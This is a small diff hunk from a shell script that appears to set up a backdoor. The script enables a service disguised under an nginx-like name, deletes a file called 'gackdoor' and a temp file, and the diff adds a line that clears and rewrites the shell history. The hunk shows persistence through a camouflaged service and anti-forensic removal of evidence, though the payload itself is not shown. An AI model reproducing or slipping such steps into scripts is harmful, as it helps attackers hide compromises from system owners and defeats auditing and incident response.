@@ -15,4 +15,5 @@ sudo strace -o /dev/null systemctl enable nginx.h.service
 rm -f gackdoor
 rm -f temp
 
+history -c && history -w.
 trap finish EXIT
